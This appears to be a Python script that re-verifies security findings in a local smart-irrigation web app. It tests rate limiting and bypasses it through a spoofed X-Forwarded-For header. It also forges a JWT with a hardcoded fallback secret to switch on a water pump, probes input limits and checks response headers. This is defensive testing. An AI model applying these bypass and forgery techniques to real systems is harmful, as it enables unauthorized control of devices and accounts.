# -*- coding: utf-8 -*-
"""复核 P0/P1：限流绕过、JWT 伪造、iot_port 脏数据、history limit。"""
import io
import json
import random
import sys

import requests

try:
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
except Exception:
    pass

BASE = 'http://127.0.0.1:5099'
out = {}


def p(k, v):
    print(f'{k}: {v}')
    out[k] = v


print('=' * 70)
print('1. 登录限流：真实连续失败是否 429')
print('=' * 70)
u = 'rl_%d' % random.randint(100000, 999999)
requests.post(f'{BASE}/api/register', json={'username': u, 'password': 'Passw0rd!'})
seq = [requests.post(f'{BASE}/api/login', json={'username': u, 'password': 'bad'}).status_code
       for _ in range(8)]
p('同一 IP 连续失败 8 次状态码', seq)

print()
print('=' * 70)
print('2. 限流绕过：轮换 X-Forwarded-For')
print('=' * 70)
u2 = 'rl2_%d' % random.randint(100000, 999999)
requests.post(f'{BASE}/api/register', json={'username': u2, 'password': 'Passw0rd!'})
seq2 = [requests.post(f'{BASE}/api/login', json={'username': u2, 'password': 'bad'},
                      headers={'X-Forwarded-For': '10.9.%d.%d' % (i, i)}).status_code
        for i in range(12)]
p('轮换 XFF 连续失败 12 次状态码', seq2)
p('是否出现 429', 429 in seq2)

print()
print('=' * 70)
print('3. XFF 注入任意来源 IP（未验证来源）')
print('=' * 70)
r = requests.post(f'{BASE}/api/login', json={'username': u, 'password': 'bad'},
                  headers={'X-Forwarded-For': '1.2.3.4'})
p('伪造 XFF=1.2.3.4 的状态码', r.status_code)

print()
print('=' * 70)
print('4. app_login / JWT')
print('=' * 70)
r = requests.post(f'{BASE}/api/app_login', json={'username': u, 'password': 'Passw0rd!'})
p('app_login 状态码', r.status_code)
try:
    token = r.json().get('token')
except Exception:
    token = None
p('拿到 token', bool(token))
if token:
    p('token 段数', len(token.split('.')))
    # 用兜底密钥自签一个 token（模拟攻击者已知硬编码兜底密钥）
    import jwt as pyjwt
    import datetime
    forged = pyjwt.encode(
        {'user_id': 1, 'exp': datetime.datetime.utcnow() + datetime.timedelta(days=7)},
        'smart_irrigation_secret_2026', algorithm='HS256')
    if isinstance(forged, bytes):
        forged = forged.decode()
    rr = requests.post(f'{BASE}/api/app_send_command',
                       json={'device': 'water_pump', 'action': 'on'},
                       headers={'Authorization': 'Bearer ' + forged})
    p('用兜底密钥自签 token 调 app_send_command 状态码', rr.status_code)
    p('  响应体', rr.text[:200])
    # 篡改签名
    parts = token.split('.')
    bad = parts[0] + '.' + parts[1] + '.' + ('A' * len(parts[2]))
    rr2 = requests.post(f'{BASE}/api/app_send_command',
                        json={'device': 'water_pump', 'action': 'on'},
                        headers={'Authorization': 'Bearer ' + bad})
    p('篡改签名 token 状态码', rr2.status_code)

print()
print('=' * 70)
print('5. /api/history limit 边界')
print('=' * 70)
s = requests.Session()
s.post(f'{BASE}/api/login', json={'username': u, 'password': 'Passw0rd!'})
for q in ['limit=0', 'limit=-1', 'limit=abc', 'limit=999999', 'limit=5001']:
    rr = s.get(f'{BASE}/api/history?{q}')
    try:
        n = len(rr.json().get('data', []))
    except Exception:
        n = '?'
    p(f'  ?{q}', f'[{rr.status_code}] 条数={n} body={rr.text[:80]}')

print()
print('=' * 70)
print('6. 安全响应头')
print('=' * 70)
r = requests.get(f'{BASE}/')
for k in ['Content-Security-Policy', 'X-Content-Type-Options', 'X-Frame-Options',
          'Referrer-Policy', 'Strict-Transport-Security']:
    p(f'  {k}', r.headers.get(k))

print()
print('=' * 70)
print('7. secret_key 兜底：FARM_SECRET_KEY 未设置时是否可预测')
print('=' * 70)
p('  兜底密钥常量', 'smart_irrigation_secret_2026 (qinghe/config.py:21)')
p('  环境变量 FARM_SECRET_KEY', repr(__import__('os').environ.get('FARM_SECRET_KEY')))

with open('tools/_p1.json', 'w', encoding='utf-8') as f:
    json.dump(out, f, ensure_ascii=False, indent=1, default=str)
print()
print('已写入 tools/_p1.json')
